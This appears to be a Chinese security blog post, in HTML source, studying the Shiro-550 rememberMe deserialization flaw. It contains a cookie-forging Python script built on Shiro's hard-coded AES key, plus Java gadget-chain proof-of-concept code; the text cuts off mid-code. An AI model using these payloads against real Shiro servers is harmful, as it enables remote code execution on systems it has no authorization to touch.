@@ -1,0 +1,243 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>shiro550反序列化 | 土豆妙妙屋</title><meta name="author" content="inyyy"><meta name="copyright" content="inyyy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="shiro550反序列化漏洞分析漏洞分析：Shiro-550 漏洞的核心问题在于 Shiro 使用硬编码的 AES 加密密钥处理 rememberMe cookie。攻击者可以利用这个已知的密钥创建恶意序列化对象，然后将其作为 rememberMe cookie 发送给服务器。服务器在反序列化这个 cookie 时，会执行其中的恶意代码，从而导致命令执行漏洞一：环境搭建用tomcat8版本+shi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shiro550反序列化">
+<meta property="og:url" content="https://inyyy.github.io/2026/01/08/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="土豆妙妙屋">
+<meta property="og:description" content="shiro550反序列化漏洞分析漏洞分析：Shiro-550 漏洞的核心问题在于 Shiro 使用硬编码的 AES 加密密钥处理 rememberMe cookie。攻击者可以利用这个已知的密钥创建恶意序列化对象，然后将其作为 rememberMe cookie 发送给服务器。服务器在反序列化这个 cookie 时，会执行其中的恶意代码，从而导致命令执行漏洞一：环境搭建用tomcat8版本+shi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp">
+<meta property="article:published_time" content="2026-01-08T11:19:03.000Z">
+<meta property="article:modified_time" content="2026-01-08T11:23:13.160Z">
+<meta property="article:author" content="inyyy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "shiro550反序列化",
+  "url": "https://inyyy.github.io/2026/01/08/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
+  "image": "https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp",
+  "datePublished": "2026-01-08T11:19:03.000Z",
+  "dateModified": "2026-01-08T11:23:13.160Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "inyyy",
+      "url": "https://inyyy.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://inyyy.github.io/2026/01/08/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'shiro550反序列化',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.0.0"></head><body><div id="web_bg" style="background-image: url(https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928001442720.JPG);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928001442720.JPG);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">土豆妙妙屋</span></a><a class="nav-page-title" href="/"><span class="site-name">shiro550反序列化</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">shiro550反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-08T11:19:03.000Z" title="发表于 2026-01-08 19:19:03">2026-01-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-08T11:23:13.160Z" title="更新于 2026-01-08 19:23:13">2026-01-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="shiro550反序列化漏洞分析"><a href="#shiro550反序列化漏洞分析" class="headerlink" title="shiro550反序列化漏洞分析"></a>shiro550反序列化漏洞分析</h1><h1 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h1><h2 id="Shiro-550-漏洞的核心问题在于-Shiro-使用硬编码的-AES-加密密钥处理-rememberMe-cookie。攻击者可以利用这个已知的密钥创建恶意序列化对象，然后将其作为-rememberMe-cookie-发送给服务器。服务器在反序列化这个-cookie-时，会执行其中的恶意代码，从而导致命令执行漏洞"><a href="#Shiro-550-漏洞的核心问题在于-Shiro-使用硬编码的-AES-加密密钥处理-rememberMe-cookie。攻击者可以利用这个已知的密钥创建恶意序列化对象，然后将其作为-rememberMe-cookie-发送给服务器。服务器在反序列化这个-cookie-时，会执行其中的恶意代码，从而导致命令执行漏洞" class="headerlink" title="Shiro-550 漏洞的核心问题在于 Shiro 使用硬编码的 AES 加密密钥处理 rememberMe cookie。攻击者可以利用这个已知的密钥创建恶意序列化对象，然后将其作为 rememberMe cookie 发送给服务器。服务器在反序列化这个 cookie 时，会执行其中的恶意代码，从而导致命令执行漏洞"></a><strong>Shiro-550 漏洞的核心问题在于 Shiro 使用硬编码的 AES 加密密钥处理 rememberMe cookie。攻击者可以利用这个已知的密钥创建恶意序列化对象，然后将其作为 rememberMe cookie 发送给服务器。服务器在反序列化这个 cookie 时，会执行其中的恶意代码，从而导致命令执行漏洞</strong></h2><h2 id="一：环境搭建"><a href="#一：环境搭建" class="headerlink" title="一：环境搭建"></a><strong>一：环境搭建</strong></h2><p><strong>用tomcat8版本+shiro项目打包的war包即可启动</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103135944671.png" alt="image-20260103135944576"></p>
+<h2 id="二-shiro550分析"><a href="#二-shiro550分析" class="headerlink" title="二:shiro550分析"></a>二:shiro550分析</h2><p><strong>用户名root，密码secret，shiro框架最大的特征就是rememberMe，需要勾选记住我选项，下一次直接自动登录，本意是为了方便用户登录，成功登陆后会返回cookie，里面就是用户对应的rememberMe字段，这个字段在后端代码经过了序列化，aes对应密钥的加密，base64编码，如果构造一个cookie，里面的rememberme字段是恶意的内容，服务器接收后进行base64解码，aes解密，反序列化就会触发命令执行，在这里面最重要的就是aes密钥，shiro550漏洞的核心原因就是密钥被硬编码在源码中，在shiro1.2.4版本以上密钥在代码中被移除，要求开发作者自己设置，不设置就动态生成，避免硬编码</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103140709237.png"></p>
+<p><strong>去源码中分析，既然要构造恶意的cookie，就要去了解cookie加密的过程才能进行逆向，全局搜索Cookie，找到一个名为CookieRememberMeManager的类，跟进</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103142952847.png" alt="image-20260103142952801"></p>
+<p><strong>进来后随便看看它的父类，看看父类实现了哪些接口</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103143349616.png" alt="image-20260103143349592"></p>
+<p><strong>在他的父类里面找到了默认加密的aes密钥，需要进行base64解密，继续回到CookieRemembermeManager类，找到了两个关键方法</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103145137193.png" alt="image-20260103145137155"></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103145314826.png" alt="image-20260103145314773"></p>
+<p><strong>这段代码的作用是先判断请求是不是一个http请求，是的话进入else，利用WebSubjectContext类创建一个subject，也就是一个用户，这个类是shiro框架里面对subjetccontext接口类的主要实现，subjectcontext接口类主要存储用户的相关信息，比如cookie，session，用户名，然后利用isidentityremoved类判断这个用户类是否被清楚，没有被清楚就进入下一个else，关键逻辑就是这里，如果里面的rememberMe字段不等于“deleteMe”,进入下一个else，判断得到的base64编码字段为不为空，不为空就进行base64解码，并返回解码内容，我们知道shiro处理rememberMe字段的方式是base64解码，解密，反序列化，接下来就关注哪个方法得到了这个解码的base64，也就是谁调用了这个方法</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103160236311.png" alt="image-20260103160236274"></p>
+<p><strong>在其父类的getRememberedPrincipals方法里面找到了对这个方法的调用，principals也就是用户身份信息，默认值为空，通过哥他RememberedSerializedIdentity方法获得一个base64解码的字节数组，并将其转换后赋值给principals变量，然后返回，跟进convertBytesToPrincipals方法</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103160838447.png" alt="image-20260103160838425"></p>
+<p><strong>在if语句里面对bytes参数进行了解密操作，跟进</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103161025498.png" alt="image-20260103161025470"></p>
+<p><strong>将未解密的字节数组赋值给变量serialized，在if语句里面，获得解密的key和加密的字节数组参数，对其进行解密，解密最后得到的就是序列化后的rememberMe字段，跟进cipherService的decrypt方法，先分析这个传入的密钥，这里是一个方法</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103162303715.png" alt="image-20260103162303693"></p>
+<p><strong>返回一个成员decryptionCipherkey，看看哪个方法调用了这个成员</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103162745548.png" alt="image-20260103162745527"></p>
+<p><strong>在一个setter方法里面找到，在看看哪个类调用了这个方法</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103162952042.png" alt="image-20260103162952020"></p>
+<p><strong>发现setCipherKey方法调用了这个方法，这里看到加密和解密方法的参数都是同一个，可以想到这是一个对称加密，再找谁调用了这个方法</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103163556275.png" alt="image-20260103163556252"></p>
+<p><strong>跟进这个传入的参数</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103163719846.png" alt="image-20260103163719823"></p>
+<p><strong>找到了这个硬编码的密钥参数，再跟进反序列化过程，看能不能找到readObject入口</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103164159109.png" alt="image-20260103164159089"></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103164350085.png" alt="image-20260103164350050"></p>
+<p>跟进后是一个接口，再跟进具体实现</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103164438007.png" alt="image-20260103164437973"></p>
+<p><strong>传入的参数是之前得到的序列化字节数组，分析这个反序列化的过程，先把序列化的数据放到一个读入字节流里面，再为这个bais对象创建一个缓冲区对象用于在缓冲区里面存放字节流，然后try操作，将数据从缓冲区队出来，并且进行反序列化，返回结果</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103164606770.png" alt="image-20260103164606753"></p>
+<h2 id="shiro550漏洞利用"><a href="#shiro550漏洞利用" class="headerlink" title="shiro550漏洞利用"></a>shiro550漏洞利用</h2><h3 id="一：urldns链"><a href="#一：urldns链" class="headerlink" title="一：urldns链"></a>一：urldns链</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103183958545.png" alt="image-20260103183958491"></h3><p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103184109266.png" alt="image-20260103184109242"></p>
+<p><strong>接下来将序列化后的数据进行加密然后再编码放进rememberme字段，发送请求即可</strong></p>
+<p><strong>脚本：</strong></p>
+<p>from email.mime import base<br>from pydoc import plain<br>import sys<br>import base64<br>from turtle import mode<br>import uuid<br>from random import Random<br>from Crypto.Cipher import AES</p>
+<p>def get_file_data(filename):<br> with open(filename, ‘rb’) as f:<br> data &#x3D; f.read()<br> return data</p>
+<p>def aes_enc(data):<br> BS &#x3D; AES.block_size<br> pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()<br> key &#x3D; “kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;”<br> mode &#x3D; AES.MODE_CBC<br> iv &#x3D; uuid.uuid4().bytes<br> encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)<br> ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(pad(data)))<br> return ciphertext</p>
+<p>def aes_dec(enc_data):<br> enc_data &#x3D; base64.b64decode(enc_data)<br> unpad &#x3D; lambda s: s[:-s[-1]]<br> key &#x3D; “kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;”<br> mode &#x3D; AES.MODE_CBC<br> iv &#x3D; enc_data[:16]<br> encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)<br> plaintext &#x3D; encryptor.decrypt(enc_data[16:])<br> plaintext &#x3D; unpad(plaintext)<br> return plaintext</p>
+<p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br> data &#x3D; get_file_data(“ser.bin”)<br> print(aes_enc(data))
+	</p>
+<p><strong>将ser.bin文件放在同一目录下即可</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103190548938.png" alt="image-20260103190548906"></p>
+<p><strong>启动tomcat服务器，登入shiro</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103190643443.png" alt="image-20260103190643407"></p>
+<p><strong>对cookie中的rememberMe字段进行替换，这里要删掉jsessionid，jsessionid存在只会对这个id进行检验，因为用户当前已经登录了，没必要看rememberMe字段</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103190951954.png" alt="image-20260103190951909"></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103191009528.png" alt="image-20260103191009502"></p>
+<p><strong>探测成功，证明存在反序列化漏洞</strong></p>
+<h2 id="二：cc11链"><a href="#二：cc11链" class="headerlink" title="二：cc11链"></a><strong>二：cc11链</strong></h2><p><strong>shiro框架的依赖中有cc库，cc6链不受jdk版本限制，在jdk8中都能跑起来</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260103191155436.png" alt="image-20260103191155415"></p>
+<p><strong>这里直接用cc6链打报错了，无法加载数组Transfoemer[],查了一下shiro框架有自定义的类加载器，导致无法加载数组，那么我们就要创造一个不需要Transformer数组的链，cc2的字节码链就不需要数组</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260104131555137.png" alt="image-20260104131548059"></p>
+<p><strong>利用InvokeTransformer反射TemplatesImpl类的newTransformer方法来触发getTransletInstance方法，从而触发defineTransletClasess方法加载字节码，这个difine方法会加载字节码，加载字节码后再newinstance方法会触发初始化导致静态方法被执行，根据之前的学习，TemplatesIMpl类的_class参数要为空且默认为空，_name参数要不为空，随便反射传一个就行</strong></p>
+<p><strong><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260104132313613.png" alt="image-20260104132313588"></strong></p>
+<p><strong>要将cc6和cc2联系起来，这个key值就必须是TemplatesImpl实例</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260104132355121.png" alt="image-20260104132355099"></p>
+<p><strong>这个key值是在TiedMapEntry进行初始化的，到这里思路理清了，sink点用cc6的</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260104154026016.png" alt="image-20260104154025945"></p>
+<p><strong>完整poc：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.rmi.CORBA.Tie;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl impl=new TemplatesImpl();</span><br><span class="line">        Field field=TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(impl,new byte[][]&#123;javasisst1.getbytes()&#125;);</span><br><span class="line">        Field field1=TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        field1.setAccessible(true);</span><br><span class="line">        field1.set(impl,&quot;aaaa&quot;);</span><br><span class="line">        Field field2=TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        field2.setAccessible(true);</span><br><span class="line">        field2.set(impl,new TransformerFactoryImpl());</span><br><span class="line">        InvokerTransformer invokerTransformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[0],new Object[0]);</span><br><span class="line">        HashMap map1=new HashMap();</span><br><span class="line">        //map1.put(&quot;aa&quot;,&quot;aabb&quot;);</span><br><span class="line">        HashMap map2=new HashMap&lt;&gt;();</span><br><span class="line">        LazyMap fakelazymap=(LazyMap)LazyMap.decorate(map2,new ConstantTransformer(1));</span><br><span class="line">        LazyMap lazyMap=(LazyMap)LazyMap.decorate(map1,invokerTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=new TiedMapEntry(fakelazymap,impl);</span><br><span class="line"></span><br><span class="line">        HashMap hashmap=new HashMap();</span><br><span class="line">        hashmap.put(tiedMapEntry,null);</span><br><span class="line"></span><br><span class="line">        Field field3= TiedMapEntry.class.getDeclaredField(&quot;map&quot;);</span><br><span class="line">        field3.setAccessible(true);</span><br><span class="line">        field3.set(tiedMapEntry,lazyMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object o) throws Exception&#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void unserialize(String f) throws Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(f));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>最开始再shirodemo中运行不行，改了下sdk为jdk8又可以了</strong></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20260104155846710.png" alt="image-20260104155846622"></p>
+<h3 id="三：cb链"><a href="#三：cb链" class="headerlink" title="三：cb链"></a>三：cb链</h3><p>PriorityQueue.readObject()<br>  -&gt; BeanComparator.compare()<br>    -&gt; PropertyUtils.getProperty()<br>      -&gt; TemplatesImpl.getOutputProperties()<br>        -&gt; TemplatesImpl#newTransformer()<br>          -&gt; …………….<br>            -&gt; TransletClassLoader.defineClass()<br>              -&gt; Evil.newInstance()</p>
+<p><strong>BeanComparator.compare方法</strong></p>
+<p><img src="C:\Users\a7787\AppData\Roaming\Typora\typora-user-images\image-20260104184150016.png" alt="image-20260104184150016"></p>
+<p><strong>在这个方法里面会调用cb库提供的PropertyUtils.getPrperty方法，如果其中的实例化对象传参为TemplatesImpl类，属性传为OutputProperties,其就回去调用该对象的getOutputProperties方法</strong></p>
+<p><img src="C:\Users\a7787\AppData\Roaming\Typora\typora-user-images\image-20260104184422666.png" alt="image-20260104184422666"></p>
+<p><strong>这个方法又会触发字节码链的关键方法newTransformer，从而形成一条链，再定位入口处</strong></p>
+<p><img src="C:\Users\a7787\AppData\Roaming\Typora\typora-user-images\image-20260104184512313.png" alt="image-20260104184512313"></p>
+<p><strong>将PriorityQueue类的成员comparator赋值为BeanComparator即可,后半部分就用TemplatesImpl字节码链</strong></p>
+<p>poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl impl=new TemplatesImpl();</span><br><span class="line">        Field field=TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(impl,new TransformerFactoryImpl());</span><br><span class="line">        Field field1=TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        field1.setAccessible(true);</span><br><span class="line">        field1.set(impl,&quot;aaa&quot;);</span><br><span class="line">        Field field2=TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        field2.setAccessible(true);</span><br><span class="line">        field2.set(impl,new byte[][]&#123;javas.getbytes()&#125;);</span><br><span class="line">        BeanComparator comparator=new BeanComparator();</span><br><span class="line">        PriorityQueue queue=new PriorityQueue(2,comparator);</span><br><span class="line">        queue.offer(1);</span><br><span class="line">        queue.offer(1);</span><br><span class="line">        Field field4=PriorityQueue.class.getDeclaredField(&quot;queue&quot;);</span><br><span class="line">        field4.setAccessible(true);</span><br><span class="line">        field4.set(queue, new Object[]&#123;impl,impl&#125;);</span><br><span class="line">        //setField(queue,&quot;queue&quot;,new Object[]&#123;impl,impl&#125;);</span><br><span class="line">        setField(comparator,&quot;property&quot;,&quot;outputProperties&quot;);</span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setField(Object object,String name,Object value) throws NoSuchFieldException, IllegalAccessException&#123;</span><br><span class="line">        Class clazz=object.getClass();</span><br><span class="line">        Field field4=clazz.getDeclaredField(name);</span><br><span class="line">        field4.setAccessible(true);</span><br><span class="line">        field4.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(java.lang.Object o) throws Exception&#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        